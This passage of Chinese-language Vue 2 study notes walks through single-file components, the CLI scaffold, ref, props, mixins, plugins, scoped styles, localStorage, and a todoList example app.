                console.log(this); //this是VueComponent的实例对象
                console.log(this.__proto__.__proto__ === Vue.prototype) //true 这里重要的内置关系哦！！！
                console.log()
                console.log(this.x);
            }
        }
    });

    new Vue({
        el:"#root",
        data:{
            msg: 'hello'
        },
        components:{
            school
        }
    });

    //验证

    // function Demo(){
    //     this.a = 1;
    //     this.b = 2;
    // }
    // const d = new Demo();
    // // console.log(d.x);
    // console.log(Demo.prototype); //显示原型属性
    // console.log(d.__proto__);// 隐士原型属性 原型对象只有一个
    // //操作原型对象追加x属性
    // Demo.prototype.x = 99;
    // console.log(d.__proto__ === Demo.prototype)
</script>
</body>
</html>
```
---

### 单文件组件

以Vue结尾的文件，这一个文件可以看作一个组件。

School.vue

```
<!-- 组件的样式 -->
<style>
h1 {
  color: red;
}
</style>

<!-- 组件的JS脚本 -->
<script>
export default {
  // 组件的名字
  name: "School",
  // 组件的数据
  data: {
    msg: "component",
  },
  // 组件的函数
  methods: {
    show() {
      alert("hello components");
    },
  },
};
</script>

<!-- 组件的html代码 -->
<template>
  <div>
    <h1>hello {{ msg }}</h1>
    <button @click="show">按钮</button>
  </div>
</template>
```

Student.vue
```
<!-- 组件的样式 -->
<style>
h1 {
  color: red;
}
</style>

<!-- 组件的JS脚本 -->
<script>
export default {
  // 组件的名字
  name: "Student",
  // 组件的数据
  data: {
    msg: "component",
  },
  // 组件的函数
  methods: {
    show() {
      alert("hello components");
    },
  },
};
</script>

<!-- 组件的html代码 -->
<template>
  <div>
    <h1>hello {{ msg }}</h1>
    <button @click="show">按钮</button>
  </div>
</template>
```

App.vue
```
<!-- 组件的样式 -->
<style>

</style>

<!-- 组件的JS脚本 -->
<script>
    // 导入组件
    import School from './School'
    import Student from './Student'

    export default ({
        // 组件命名
        name: 'App',
        // 组件注册
        components: {
            School,
            Student
        }
    })
</script>

<!-- 组件的html代码 -->
<template>
    <!-- 使用组件 -->
    <div>
        <school></school>
        <student></student>
    </div>
</template>
```

单文件组件使用的目录

![image](9F52A145B5974559B7BF3B893EB6E79D)

但是这种需要在脚手架中使用。

---

### Vue脚手架使用

![image](87F633F3610746AAB263A432BB14B7F8)

按照的目录文件如下：
![image](C2503188DAC94C09AB09435B9CD922B4)

---

### 脚手架结构

![image](534A39558C37458897F474A804B79346)

main.js项目的入口。

文件结构

![image](9301D1B6123A4B0B8EFF3952A900D91F)

main.js

```
import Vue from 'vue' //这里引入的是残缺版的vue,是没有模版解析器是不能写template的 vue.runtime.esm.js
import App from './App.vue'
// import Vue from 'vue/dist/vue';

Vue.config.productionTip = false;

/*
	关于不同版本的Vue：

		1.vue.js与vue.runtime.xxx.js的区别：
				(1).vue.js是完整版的Vue，包含：核心功能+模板解析器。
				(2).vue.runtime.xxx.js是运行版的Vue，只包含：核心功能；没有模板解析器。

		2.因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用
			render函数接收到的createElement函数去指定具体内容。
*/

new Vue({
  // template: `<App></App>`,
  // components: { App },
  // render: h => h(App),
  el:'#app',
  render: h => h(App),
  //vue 传递帮你调render函数并传递了一个名为createElement的函数,这里的第一个参数代表h1元素，第二个参数是h1的内容
  // render:(createElement) => createElement('h1',"迟缓")
  // el:'#app',
  // template: '<h1>你好</h1>'
}).$mount('#app')
```

App.vue
```
<template>
   <div>
     <img src="./assets/logo.png" alt="logo">
     <School></School>
     <Student></Student>
   </div>
</template>

<script>
import School from './components/School';
import Student from "./components/Student";

export default {
  name: "App",
  //汇总所有的组件
  components:{
    Student,
    School
  }
}
</script>
```

Student.vue
```
<template>
<!--  组件的交互-->
   <div>
     <h2>学生姓名:{{ name }}</h2>
     <h2>学生年龄:{{ age }}</h2>
     <button @click="showName">点我提示学生姓名</button>
   </div>
</template>

<!--<style>-->
<!--  /*css样式*/-->
<!--  .demo{-->
<!--    background: skyblue;-->
<!--  }-->
<!--</style>-->


<script>
  //组件交互的代码
  //export default school分别暴露
  export default {
    name: 'Student', //开发者工具最终呈现的名字为School
    data(){
      return {
        name:'panyue',
        age:21
      }
    },
    methods:{
      showName(){
        alert(this.name);
      }
    }
  };

  //统一暴露
  // export { school };
  // export default school //默认暴露
</script>
```

School.vue
```
<template>
<!--  组件的交互-->
   <div class="demo">
     <h2>学校名称:{{ name }}</h2>
     <h2>学校地址:{{ address }}</h2>
     <button @click="showName">点我提示学校名</button>
   </div>
</template>

<style>
  /*css样式*/
  .demo{
    background: skyblue;
  }
</style>


<script>
  //组件交互的代码
  //export default school分别暴露
  export default {
    name: 'School', //开发者工具最终呈现的名字为School
    data(){
      return {
        name:'武汉科技大学',
        address: '武汉'
      }
    },
    methods:{
      showName(){
        alert(this.name);
      }
    }
  };

  //统一暴露
  // export { school };
  // export default school //默认暴露
</script>
```

---

### 脚手架默认配置

![image](0A01739CFA184B5189994AA1AEA724CF)

---

### ref属性

函数中获取DOM节点。

```
<!-- 单文件组件 -->
<!-- App.vue组件是所有组件的父组件 -->

<!-- 组件html代码 -->
<template>
  <div id="app">
    <h1 v-text="msg" id="title"></h1>
    <button @click="showDOM">点我展示上方的DOM</button>
    <MySchool></MySchool>
  </div>
</template>

<!-- 组件脚本文件 -->
<script>
// 引入MySchool组件
import MySchool from "./components/MySchool.vue";

export default {
  // 组件命名
  name: "App",
  // 注册组件
  components: {
    MySchool,
  },
  data() {
    return {
      msg: "vue",
    };
  },
  methods: {
    showDOM() {
      console.log(document.getElementById("title"));
    },
  },
};
</script>

<!-- 组件样式 -->
<style></style>
```

使用ref属性

```
<!-- 单文件组件 -->
<!-- App.vue组件是所有组件的父组件 -->

<!-- 组件html代码 -->
<template>
  <div id="app">
    <!-- 使用ref -->
    <h1 v-text="msg" ref="title"></h1>
    <button @click="showDOM">点我展示上方的DOM</button>
    <MySchool></MySchool>
  </div>
</template>

<!-- 组件脚本文件 -->
<script>
// 引入MySchool组件
import MySchool from "./components/MySchool.vue";

export default {
  // 组件命名
  name: "App",
  // 注册组件
  components: {
    MySchool,
  },
  data() {
    return {
      msg: "vue",
    };
  },
  methods: {
    showDOM() {
      console.log(this);
    },
  },
};
</script>

<!-- 组件样式 -->
<style></style>
```

![image](00770ECCAF9C44F282ECC89EEE9F99C2)

Vue实例对象的ref属性中有这个DOM节点。

组件中使用ref属性。

```
<!-- 单文件组件 -->
<!-- App.vue组件是所有组件的父组件 -->

<!-- 组件html代码 -->
<template>
  <div id="app">
    <!-- 使用ref -->
    <h1 v-text="msg" ref="title"></h1>
    <button @click="showDOM">点我展示上方的DOM</button>
    <!-- 组件中使用ref属性，得到的是VueComponent对象 -->
    <MySchool ref="sch"></MySchool>
  </div>
</template>

<!-- 组件脚本文件 -->
<script>
// 引入MySchool组件
import MySchool from "./components/MySchool.vue";

export default {
  // 组件命名
  name: "App",
  // 注册组件
  components: {
    MySchool,
  },
  data() {
    return {
      msg: "vue",
    };
  },
  methods: {
    showDOM() {
      // 输出DOM节点
      console.log(this.$refs.title);
      // 输出DOM节点
      console.log(this.$refs.sch);
    },
  },
};
</script>

<!-- 组件样式 -->
<style></style>
```

![image](08D29AF813394AAC8653C019BED859C0)

---

### props属性

如何通过父组件向子组件传参数？props。

父组件
```
<!-- 单文件组件 -->
<!-- App.vue组件是所有组件的父组件 -->

<!-- 组件html代码 -->
<template>
  <div id="app">
    <MySchool name="mike" age="18" sex="男"></MySchool>
    <MySchool name="jack" age="20" sex="男"></MySchool>
  </div>
</template>

<!-- 组件脚本文件 -->
<script>
// 引入MySchool组件
import MySchool from "./components/MySchool.vue";

export default {
  // 组件命名
  name: "App",
  // 注册组件
  components: {
    MySchool,
  },
  data() {
    return {};
  },
};
</script>

<!-- 组件样式 -->
<style></style>
```

子组件
```
<!-- 组件的样式 -->
<style>
h1 {
  color: red;
}
</style>

<!-- 组件的JS脚本 -->
<script>
export default {
  // 组件的名字
  name: "MySchool",
  // 组件的数据
  data() {
    return {
      msg: "component",
    };
  },
  // 组件的函数
  methods: {
    show() {
      console.log(this);
    },
  },
  // 子组件中介绍传过来的属性
  props: ["name", "age", "sex"],
};
</script>

<!-- 组件的html代码 -->
<template>
  <div>
    <h1>{{ name }}</h1>
    <h1>{{ age }}</h1>
    <h1>{{ sex }}</h1>
    <button @click="show">按钮</button>
  </div>
</template>
```

子组件中限制传入属性的类型。
```
<!-- 组件的样式 -->
<style>
h1 {
  color: red;
}
</style>

<!-- 组件的JS脚本 -->
<script>
export default {
  // 组件的名字
  name: "MySchool",
  // 组件的数据
  data() {
    return {
      msg: "component",
    };
  },
  // 组件的函数
  methods: {
    show() {
      console.log(this);
    },
  },
  // 子组件中介绍传过来的属性
  // 限制父组件传过来的属性类型
  props: {
    name: String,
    age: Number,
    sex: String,
  },
};
</script>

<!-- 组件的html代码 -->
<template>
  <div>
    <h1>{{ name }}</h1>
    <h1>{{ age }}</h1>
    <h1>{{ sex }}</h1>
    <button @click="show">按钮</button>
  </div>
</template>
```

子组件中给传入的属性进行限制。

```
<!-- 组件的样式 -->
<style>
h1 {
  color: red;
}
</style>

<!-- 组件的JS脚本 -->
<script>
export default {
  // 组件的名字
  name: "MySchool",
  // 组件的数据
  data() {
    return {
      msg: "component",
    };
  },
  // 组件的函数
  methods: {
    show() {
      console.log(this);
    },
  },
  // 子组件中介绍传过来的属性
  // 限制父组件传过来的属性类型
  props: {
    name: {
      type: String,
      required: true
    },
    age: {
      type: Number,
      default: 1, 
    },
    sex: {
      type: String,
      required: true
    }
  },
};
</script>

<!-- 组件的html代码 -->
<template>
  <div>
    <h1>{{ name }}</h1>
    <h1>{{ age }}</h1>
    <h1>{{ sex }}</h1>
    <button @click="show">按钮</button>
  </div>
</template>
```

不可以对传入的属性进行更改。

```
<!-- 组件的样式 -->
<style>
h1 {
  color: red;
}
</style>

<!-- 组件的JS脚本 -->
<script>
export default {
  // 组件的名字
  name: "MySchool",
  // 组件的数据
  data() {
    return {};
  },
  // 组件的函数
  methods: {
    change() {
      // 不可以修改传入的props属性
      this.name = "alice";
    },
  },
  // 子组件中介绍传过来的属性
  // 限制父组件传过来的属性类型
  props: {
    name: {
      type: String,
      required: true,
    },
    age: {
      type: Number,
      default: 1,
    },
    sex: {
      type: String,
      required: true,
    },
  },
};
</script>

<!-- 组件的html代码 -->
<template>
  <div>
    <h1>{{ name }}</h1>
    <h1>{{ age }}</h1>
    <h1>{{ sex }}</h1>
    <button @click="change">按钮</button>
  </div>
</template>
```

```
<!-- 组件的样式 -->
<style>
h1 {
  color: red;
}
</style>

<!-- 组件的JS脚本 -->
<script>
export default {
  // 组件的名字
  name: "MySchool",
  // 组件的数据
  // data中也定义了name
  data() {
    return {
      name: "tom",
    };
  },
  // 组件的函数
  methods: {
    change() {
      console.log(this);
    },
  },
  // props中也有name属性
  // 此时会报错
  props: {
    name: {
      type: String,
      required: true,
    },
    age: {
      type: Number,
      default: 1,
    },
    sex: {
      type: String,
      required: true,
    },
  },
};
</script>

<!-- 组件的html代码 -->
<template>
  <div>
    <h1>{{ name }}</h1>
    <h1>{{ age }}</h1>
    <h1>{{ sex }}</h1>
    <button @click="change">按钮</button>
  </div>
</template>
```

```
<!-- 组件的样式 -->
<style>
h1 {
  color: red;
}
</style>

<!-- 组件的JS脚本 -->
<script>
export default {
  // 组件的名字
  name: "MySchool",
  // 组件的数据
  // data中也定义了name
  data() {
    return {
      MyName: this.name,
    };
  },
  // 组件的函数
  methods: {
    change() {
      this.MyName++;
    },
  },
  // props中也有name属性
  // 此时会报错
  props: {
    name: {
      type: String,
      required: true,
    },
    age: {
      type: Number,
      default: 1,
    },
    sex: {
      type: String,
      required: true,
    },
  },
};
</script>

<!-- 组件的html代码 -->
<template>
  <div>
    <h1>{{ MyName }}</h1>
    <h1>{{ age }}</h1>
    <h1>{{ sex }}</h1>
    <button @click="change">按钮</button>
  </div>
</template>
```

总结

```
<template>
   <div class="demo">
     <!--注意props传递过来的值是不能改的(尽量避免去改，控制台会有警告)-->
     <h1>{{ msg }}</h1>
     <h2>姓名:{{ myName }}</h2>
     <h2>年龄: {{  age }}</h2>
     <h2>性别: {{ sex }}</h2>
     <button @click="updateName">尝试修改名字</button>
   </div>
</template>

<script>
export default {
  name: "Student",
  // props: ['name', 'sex', 'age'], //简单声明接收
  data(){
    console.log(this);
    return {
      //如果props和data存在同名的属性，会报错，但已props传递的属性值为主
      //注意props属性名不能是vue底层已征用的属性名(比如key, ref等等)
      msg: '我是一名普通的大学生',
      myName: this.name //把props传递过来的值当成vc的状态，这样改name是不会出问题的，因为你没有直接去修改props
    }
  },
  methods:{
    updateName(){
      this.myName = 'sss';
    }
  },
  //限制props中属性的类型 类型错误了会提示错误信息
  // props: {
  //   name: String,
  //   sex: String,
  //   age: Number
  // }

  //接收时不仅限制类型还加上默认值的指定并指定它的必须性
  props:{
    name:{
      type: String, //类型
      required: true //必要的
    },
    age:{
      type: Number,
      default: 99 //默认值
    },
    sex:{
      type: String,
      required: true
    }
  }
}
</script>

```

---

### mixin

2个组件中存在相同的部分，比如showName函数。

此时可以使用mixin简化代码。

目录结构如下：

![image](3A42AAC5A1C74B78BF3A887425B13B22)

mixin.js
```
export const mixin = {
  methods: {
    showName() {
      alert(this.MyName);
    },
  },
};
```

MyStudent.vue
```
<!-- 组件的样式 -->
<style>
h1 {
  color: red;
}
</style>

<!-- 组件的JS脚本 -->
<script>
import { mixin } from "../mixin";
export default {
  // 组件的名字
  name: "MyStudent",
  // 组件的数据
  // data中也定义了name
  data() {
    return {
      MyName: "mike",
    };
  },
  mixins: [mixin],
};
</script>

<!-- 组件的html代码 -->
<template>
  <div>
    <h1>{{ MyName }}</h1>
    <button @click="showName">按钮</button>
  </div>
</template>
```

MySchool.vue
```
<!-- 组件的样式 -->
<style>
h1 {
  color: red;
}
</style>

<!-- 组件的JS脚本 -->
<script>
import { mixin } from "../mixin";
export default {
  // 组件的名字
  name: "MySchool",
  // 组件的数据
  data() {
    return {
      MyName: "jack",
    };
  },
  mixins: [mixin],
};
</script>

<!-- 组件的html代码 -->
<template>
  <div>
    <h1>{{ MyName }}</h1>
    <button @click="showName">按钮</button>
  </div>
</template>
```

实例

文件结构

![image](97087AF007F24DEFA983D52DE249DFCC)

mixin.js
```
export const mixin = {
    methods:{
        showName(){
            alert(this.name)
        }
    },
    //挂载完毕就执行
    mounted() {
        console.log('你好啊')
    }
}

export const shareData = {
    data(){
        return {
            x:100,
            y:200
        }
    }
}
```

main.js
```
//引入Vue
import Vue from "vue";
//引入App
import App from './App';

// import { mixin, shareData } from "@/mixin";

//关闭Vue的生产提示
Vue.config.productionTip = false;
//全局混合
// Vue.mixin(mixin);
// Vue.mixin(shareData);

new Vue({
    el:'#app',
    render: h => h(App)
});
```

App.vue
```
<template>
   <div>
      <Student />
      <hr/>
     <School/>
   </div>
</template>

<script>
import Student from "@/components/Student";
import School from "@/components/School";
export default {
  name: "App",
  components:{
    School,
    Student,
  },
}
</script>
```

School.vue
```
<template>
   <div >
     <h2 @click="showName">学校名称:{{  name }}</h2>
     <h2>学校地址: {{ address }}</h2>
   </div>
</template>

<script>
//引入混合
import {  mixin, shareData } from "@/mixin";
export default {
  name: "School",
  data(){
    console.log(this);
    return {
       name: 'wust',
       address: '武汉科技大学'
    }
  },
  mixins:[ mixin, shareData ]
}
</script>
```

Student.vue
```
<template>
   <div >
     <h2 @click="showName">姓名:{{  name }}</h2>
     <h2>性别: {{ sex }}</h2>
   </div>
</template>

<script>
import {  mixin,  shareData } from "@/mixin";
export default {
  name: "Student",
  data(){
    console.log(this);
    return {
       name: '张三',
       sex: '男',
       x:666 //如果混合中配置了与data(或者配置了相同的methods)相同的属性值，则以你的配置的属性为主(而不以mixin为主)
    }
  },
  mounted() {
    console.log('你好啊啊！！！！')  //但对于生命周期钩子是都会保存的(混合的钩子比你配置的钩子先跑)
  },
  mixins:[ mixin, shareData ]
}
</script>
```

---

### 插件

![image](1EE3BA9E448E4D3DAF238ED212B31215)

文件结构

![image](D62362D24A3D4E66AD25AC8BF24A8839)

plugin.js

```
//vm和vc都可以用
export default {
    install(Vue){
        //vue帮你调用install方法
        // console.log('install');
        // console.log(Vue); //vm的构造函数Vue

        //全局过滤器
        Vue.filter('mySlice', function (val){
            return val.slice(0,4);
        });

        //全局指令
        Vue.directive('fbind', {
            bind(el, binding){
                // console.log('bind')
                el.value = binding.value;
            },
            //指令被插入页面时
            inserted(el, binding){
                // console.log('inserted')
                el.focus();
            },
            //指令所在模版被重新解析时
            update(el, binding){
                // console.log('update');
                el.value = binding.value;
            }
        });


        //全局混入
        Vue.mixin({
            data(){
                return {
                    x:1,
                    y:2
                }
            }
        });

        //给vue原型上添加一个方法 vc/vm都可以使用
        Vue.prototype.hello = function (){
            alert('hello')
        }
    }
}
```

main.js
```
//引入Vue
import Vue from "vue";
//引入App
import App from './App';

//引入插件
import plugins from './plugins';

//关闭Vue的生产提示
Vue.config.productionTip = false;

Vue.use(plugins); //vue应用插件

new Vue({
    el:'#app',
    render: h => h(App)
});
```

App.vue
```
<template>
   <div>
      <Student/>
      <hr/>
      <School/>
   </div>
</template>

<script>
import Student from "@/components/Student";
import School from "@/components/School";
export default {
  name: "App",
  components:{
    School,
    Student,
  },
}
</script>
```

School.vue
```
<template>
   <div >
     <h2>学校名称:{{  name | mySlice }}</h2>
     <h2>学校地址: {{ address }}</h2>
     <button @click="test">点我测试一下hello</button>
   </div>
</template>

<script>
export default {
  name: "School",
  data(){
    console.log(this);
    return {
       name: 'wust university',
       address: '武汉科技大学'
    }
  },
  methods:{
    test(){
      this.hello();
    }
  }
}
</script>
```

Student.vue
```
<template>
   <div >
     <h2>姓名:{{  name }}</h2>
     <h2>性别: {{ sex }}</h2>
     <input v-fbind:value="name"/>
   </div>
</template>

<script>

export default {
  name: "Student",
  data(){
    console.log(this);
    return {
       name: '张三',
       sex: '男',
    }
  },
}
</script>
```

---

### scope样式

文件结构

![image](56D2D1DE614B4EE2B2BEBE05A9C75011)

main.js

```
//引入Vue
import Vue from "vue";
//引入App
import App from './App';

//关闭Vue的生产提示
Vue.config.productionTip = false;


new Vue({
    el:'#app',
    render: h => h(App)
});
```

App.vue
```
<template>
   <div>
      <Student/>
      <hr/>
      <School/>
   </div>
</template>

<script>
import Student from "@/components/Student";
import School from "@/components/School";
export default {
  name: "App",
  components:{
    School,
    Student,
  },
}
</script>

<style>
   /*
   全局的样式是不需要加scoped
   全局共享
   */
   .title{
     color: red;
   }
</style>
```

School.vue
```
<template>
   <div class="demo">
     <h2>学校名称:{{  name }}</h2>
     <h2>学校地址: {{ address }}</h2>
   </div>
</template>

<script>
export default {
  name: "School",
  data(){
    console.log(this);
    return {
       name: 'wust university',
       address: '武汉科技大学'
    }
  },
}
</script>

<style scoped>
   /*scoped代表局部的*/
  .demo{
    background: skyblue;
  }
</style>
```

Student.vue
```
<template>
   <div class="demo">
     <h2 class="title">姓名:{{  name }}</h2>
     <h2>性别: {{ sex }}</h2>
   </div>
</template>

<script>

export default {
  name: "Student",
  data(){
    console.log(this);
    return {
       name: '张三',
       sex: '男',
    }
  },
}
</script>

<style scoped>
  .demo{
    background: orange;
  }
</style>
```

---

### todoList

App.vue
```
<!-- 单文件组件 -->
<!-- App.vue组件是所有组件的父组件 -->

<!-- 组件html代码 -->
<template>
  <div id="app">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHeader :addTodo="addTodo"></MyHeader>
        <MyList
          :todoList="todoList"
          :checkTodo="checkTodo"
          :deleteTodo="deleteTodo"
        ></MyList>
        <MyFooter
          :todoList="todoList"
          :checkAllTodo="checkAllTodo"
          :deleteFinishItem="deleteFinishItem"
        ></MyFooter>
      </div>
    </div>
  </div>
</template>

<!-- 组件脚本文件 -->
<script>
import MyFooter from "./components/MyFooter.vue";
import MyHeader from "./components/MyHeader.vue";
import MyList from "./components/MyList.vue";
export default {
  // 组件命名
  name: "App",
  // 注册组件
  components: {
    MyFooter,
    MyHeader,
    MyList,
  },
  data() {
    return {
      todoList: [
        { id: "001", title: "吃饭", done: true },
        { id: "002", title: "睡觉", done: true },
        { id: "003", title: "学习Vue", done: true },
      ],
    };
  },
  methods: {
    addTodo(todoObj) {
      this.todoList.unshift(todoObj);
    },
    checkTodo(id) {
      this.todoList.forEach((item) => {
        if (item.id === id) item.done = !item.done;
      });
    },
    deleteTodo(id) {
      this.todoList = this.todoList.filter((item) => item.id != id);
    },
    checkAllTodo(flag) {
      if (flag) {
        this.todoList.forEach((item) => {
          item.done = true;
        });
      } else {
        this.todoList.forEach((item) => {
          item.done = false;
        });
      }
    },
    deleteFinishItem() {
      this.todoList = this.todoList.filter((item) => {
        return !item.done;
      });
    },
  },
};
</script>

<!-- 组件样式 -->
<style>
body {
  background: #fff;
}
.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2);
  border-radius: 4px;
}
.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}
.btn-danger:hover {
  color: #fff;
  background-color: #da4f49;
}
.btn:focus {
  outline: none;
}
.todo-container {
  widows: 600px;
  margin: 0 auto;
}
.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}
</style>
```

MyHeader.vue
```
<style scoped>
.todo-header input {
  width: 600px;
  height: 28px;
  font-size: 14px;
  border: 1px solid #ccc;
  border-radius: 4px;
  padding: 4px 7px;
}
.todo-header input:focus {
  outline: none;
  border-color: rgba(82, 168, 236, 0.8);
}
</style>

<script>
import { nanoid } from "nanoid";
export default {
  name: "MyHeader",
  props: ["addTodo"],
  methods: {
    addTodoItem(e) {
      if (e.target.value.trim() === "") return alert("输入不可为空");
      const todoObj = { id: nanoid(), title: e.target.value, done: false };
      this.addTodo(todoObj);
      e.target.value = "";
    },
  },
};
</script>

<template>
  <div class="todo-header">
    <input type="text" placeholder="请输入" @keyup.enter="addTodoItem" />
  </div>
</template>
```

MyItem.vue
```
<style scoped>
li {
  list-style: none;
  height: 36px;
  line-height: 36px;
  padding: 0 5px;
  border-bottom: 1px solid #ddd;
}
li label {
  float: left;
  cursor: pointer;
}
li label li input {
  vertical-align: middle;
  margin-right: 6px;
  position: relative;
  top: -1px;
}
li button {
  float: right;
  display: none;
  margin-top: 3px;
}
li:before {
  content: initial;
}
li:last-child {
  border-bottom: none;
}
li:hover {
  background-color: #ddd;
}
li:hover button {
  display: block;
}
</style>

<script>
export default {
  name: "MyItem",
  props: ["todoItem", "checkTodo", "deleteTodo"],
  methods: {
    handelCheck(id) {
      if (confirm("确定吗？")) {
        this.checkTodo(id);
      }
    },
    deleteTodoItem(id) {
      if (confirm("确认删除吗？")) {
        this.deleteTodo(id);
      }
    },
  },
};
</script>

<template>
  <li>
    <label for="">
      <input
        type="checkbox"
        :checked="todoItem.done"
        @change="handelCheck(todoItem.id)"
      />
      <span>{{ todoItem.title }}</span>
    </label>
    <button class="btn btn-danger" @click="deleteTodoItem(todoItem.id)">
      删除
    </button>
  </li>
</template>
```

MyList.vue
```
<style>
.todo-main {
  margin-left: 0px;
  border: 1px solid #ddd;
  border-radius: 4px;
  padding: 0px;
}
.todo-empty {
  height: 40px;
  line-height: 40px;
  border: 1px solid #ddd;
  border-radius: 4px;
  padding-left: 5px;
  margin-top: 10px;
}
</style>

<script>
import MyItem from "./MyItem.vue";
export default {
  name: "MyList",
  components: {
    MyItem,
  },
  props: ["todoList", "checkTodo", "deleteTodo"],
};
</script>

<template>
  <div class="todo-main">
    <MyItem v-for="item in todoList" :key="item.id" :todoItem="item" :checkTodo="checkTodo" :deleteTodo="deleteTodo"></MyItem>
  </div>
</template>
```

MyFooter.vue
```
<style scoped>
.todo-footer {
  height: 40px;
  line-height: 40px;
  padding-left: 6px;
  margin-top: 5px;
}
.todo-footer label {
  display: inline-block;
  margin-right: 20px;
  cursor: pointer;
}

.todo-footer label input {
  position: relative;
  top: -1px;
  vertical-align: middle;
  margin-right: 5px;
}

.todo-footer button {
  float: right;
  margin-top: 5px;
}
</style>

<script>
export default {
  name: "MyFooter",
  props: ["todoList", "checkAllTodo", "deleteFinishItem"],
  computed: {
    doneTotal() {
      let i = 0;
      this.todoList.forEach((item) => {
        if (item.done) i++;
      });
      return i;
    },
    total() {
      return this.todoList.length;
    },
    isAll: {
      get() {
        return this.doneTotal === this.total;
      },
      set(value) {
        this.checkAllTodo(value);
      },
    },
  },
  methods: {
    clearAllFinishItem() {
      this.deleteFinishItem();
    },
  },
};
</script>

<template>
  <div class="todo-footer" v-show="total">
    <label for="">
      <input type="checkbox" v-model="isAll" />
    </label>
    <span>
      <span>已完成 {{ doneTotal }} / 全部{{ todoList.length }}</span>
    </span>
    <button class="btn btn-danger" @click="clearAllFinishItem">
      清除已完成任务
    </button>
  </div>
</template>
```

---

### todoList总结

![image](F99805B8046C43ADAD132E3C44681BA9)

---

### 浏览器本地存储

![image](71E913DE5B134881A57B0902889768CF)

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>localStorage</title>
</head>
<body>
  <h2>localstorage</h2>
  <button onclick="saveData()">点我保存一个数据</button>
  <button onclick="readData()">点我读取一个数据</button>
  <button onclick="deleteData()">点我删除一个数据</button>
  <button onclick="removeAllData()">清空所有数据</button>
</body>
<script type="text/javascript">
    function saveData(){
        localStorage.setItem('msg1', 'panyue,hello');
        //对象转换为字符串
        localStorage.setItem('msg2',JSON.stringify({
            name: 'panyue',
            age: '21',
            school: 'wust(WuHan)'
        }))
    }

    function readData(){
        console.log(localStorage.getItem('msg1'))
        console.log(JSON.parse(localStorage.getItem('msg2')));
        console.log(localStorage.getItem('text')); //读不出来就是null Json.parse(null)仍然是null注意
    }

    function deleteData(){
        localStorage.removeItem('msg2');
    }

    function removeAllData(){
       localStorage.clear();
    }
</script>
</html>
```

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>sessionStorage</title>
</head>
<body>
<h2>sessionStorage</h2>
<button onclick="saveData()">点我保存一个数据</button>
<button onclick="readData()">点我读取一个数据</button>
<button onclick="deleteData()">点我删除一个数据</button>
<button onclick="removeAllData()">清空所有数据</button>
</body>
<script type="text/javascript">
    function saveData(){
        sessionStorage.setItem('msg1', 'panyue,hello');
        //对象转换为字符串
        sessionStorage.setItem('msg2',JSON.stringify({
            name: 'panyue',
            age: '21',
            school: 'wust(WuHan)'
        }))
    }

    function readData(){
        console.log(sessionStorage.getItem('msg1'))
        console.log(JSON.parse(sessionStorage.getItem('msg2')));
        console.log(sessionStorage.getItem('text')); //读不出来就是null Json.parse(null)仍然是null注意
    }

    function deleteData(){
        sessionStorage.removeItem('msg2');
    }

    function removeAllData(){
        sessionStorage.clear();
    }
</script>
</html>
```

---

### todoList实现本地存储

改动App.vue

```
<!-- 单文件组件 -->
<!-- App.vue组件是所有组件的父组件 -->

<!-- 组件html代码 -->
<template>
  <div id="app">
    <div class="todo-container">
      <div class="todo-wrap">
        <MyHeader :addTodo="addTodo"></MyHeader>
        <MyList
          :todoList="todoList"
          :checkTodo="checkTodo"
          :deleteTodo="deleteTodo"
        ></MyList>
        <MyFooter
          :todoList="todoList"
          :checkAllTodo="checkAllTodo"
          :deleteFinishItem="deleteFinishItem"
        ></MyFooter>
      </div>
    </div>
  </div>
</template>

<!-- 组件脚本文件 -->
<script>
import MyFooter from "./components/MyFooter.vue";
import MyHeader from "./components/MyHeader.vue";
import MyList from "./components/MyList.vue";
export default {
  // 组件命名
  name: "App",
  // 注册组件
  components: {
    MyFooter,
    MyHeader,
    MyList,
  },
  data() {
    return {
      todoList: JSON.parse(localStorage.getItem("todos")) || []
    };
  },
  watch: {
    todoList: {
      deep: true,
      handler(value) {
        localStorage.setItem("todos", JSON.stringify(value));
      }
      
    },
  },
  methods: {
    addTodo(todoObj) {
      this.todoList.unshift(todoObj);
    },
    checkTodo(id) {
      this.todoList.forEach((item) => {
        if (item.id === id) item.done = !item.done;
      });
    },
    deleteTodo(id) {
      this.todoList = this.todoList.filter((item) => item.id != id);
    },
    checkAllTodo(flag) {
      if (flag) {
        this.todoList.forEach((item) => {
          item.done = true;
        });
      } else {
        this.todoList.forEach((item) => {
          item.done = false;
        });
      }
    },
    deleteFinishItem() {
      this.todoList = this.todoList.filter((item) => {
        return !item.done;
      });
    },
  },
};
</script>

<!-- 组件样式 -->
<style>
body {
  background: #fff;
}
.btn {
  display: inline-block;
  padding: 4px 12px;
  margin-bottom: 0;
  font-size: 14px;
  line-height: 20px;
  text-align: center;
  vertical-align: middle;
  cursor: pointer;
  box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2);
  border-radius: 4px;
}
.btn-danger {
  color: #fff;
  background-color: #da4f49;
  border: 1px solid #bd362f;
}
.btn-danger:hover {
  color: #fff;
  background-color: #da4f49;
}
.btn:focus {
  outline: none;
}
.todo-container {
  widows: 600px;
  margin: 0 auto;
}
.todo-container .todo-wrap {
  padding: 10px;
  border: 1px solid #ddd;
  border-radius: 5px;
}
</style>
```

---

### 自定义事件

组件传参-子组件传参给父组件

App.vue
```
<!-- 单文件组件 -->
<!-- App.vue组件是所有组件的父组件 -->

<!-- 组件html代码 -->
<template>
  <div id="app">
    <h1>{{ msg }}</h1>
    <MySchool :getSchoolName="getSchoolName"></MySchool>
    <MyStudent></MyStudent>
  </div>
</template>

<!-- 组件脚本文件 -->
<script>
import MyStudent from "./components/MyStudent.vue";
import MySchool from "./components/MySchool.vue";
export default {
  // 组件命名
  name: "App",
  // 注册组件
  components: {
    MyStudent,
    MySchool,
  },
  data() {
    return {
      msg: "你好",
    };
  },
  methods: {
    getSchoolName(name) {
      console.log('APP 组件收到来自School组件的',name)
    }
  }
};
</script>

